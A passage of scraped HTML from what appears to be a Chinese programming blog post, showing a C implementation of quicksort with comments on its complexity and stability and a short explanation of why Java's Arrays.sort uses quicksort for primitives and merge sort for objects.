class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b92422256329-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b92422256329-55\">55</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-3\"><span class=\"crayon-c\">// 分类 ------------ 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-4\"><span class=\"crayon-c\">// 数据结构 --------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- 每次选取的基准都是最大（或最小）的元素，导致每次只划分出了一个分区，需要进行n-1次划分才能结束递归，时间复杂度为O(n^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- 每次选取的基准都是中位数，这样每次都均匀的划分出两个分区，只需要logn次划分就能结束递归，时间复杂度为O(nlogn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(nlogn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ 主要是递归造成的栈空间的使用(用来保存left和right等局部变量)，取决于递归树的深度，一般为O(logn)，最差为O(n)       </span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-9\"><span class=\"crayon-c\">// 稳定性 ---------- 不稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-16\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-17\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-18\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Partition</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 划分函数</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-19\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">               </span><span class=\"crayon-c\">// 这里每次都选择最后一个元素作为基准</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// tail为小于基准的子数组最后一个元素的索引</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 遍历基准以外的其他元素</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">              </span><span class=\"crayon-c\">// 把小于等于基准的元素放到前一个子数组末尾</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-26\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span><span class=\"crayon-v\">tail</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">Swap</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// 最后把基准放到前一个子数组的后边，剩下的子数组既是大于基准的子数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-30\"><span class=\"crayon-h\">                                        </span><span class=\"crayon-c\">// 该操作很有可能把后面元素的稳定性打乱，所以快速排序是不稳定的排序算法</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// 返回基准的索引</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-32\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-33\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-34\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-35\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot_index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Partition</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 基准的索引</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot_index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot_index</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-41\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-42\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-43\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-44\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 从小到大快速排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">QuickSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"快速排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-51\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b92422256329-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b92422256329-55\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.6627 seconds] -->\r\n<p>使用快速排序法对一列数字进行排序的过程：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773uwbpqg207s05ytay.gif\" width=\"280\" height=\"214\"></p>\n<p><strong>快速排序是不稳定的排序算法，不稳定发生在基准元素与A[tail+1]交换的时刻。</strong></p>\n<p>比如序列：{ 1, 3, 4, 2, 8, 9, 8, 7, 5 }，基准元素是5，一次划分操作后5要和第一个8进行交换，从而改变了两个元素8的相对次序。</p>\n<blockquote><p>Java系统提供的Arrays.sort函数。对于基础类型，底层使用快速排序。对于非基础类型，底层使用归并排序。请问是为什么？</p></blockquote>\n<p>答：这是考虑到排序算法的稳定性。对于基础类型，相同值是无差别的，排序前后相同值的相对位置并不重要，所以选择更为高效的快速排序，尽管它是不稳定的排序算法；而对于非基础类型，排序前后相等实例的相对位置不宜改变，所以选择稳定的归并排序。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113863\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113863votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113863\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 19 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,排序算法,算法", "url": "http://blog.jobbole.com/113863/", "url_obj_id": "10ced989709fd8ca75a2272ea7f16567"}
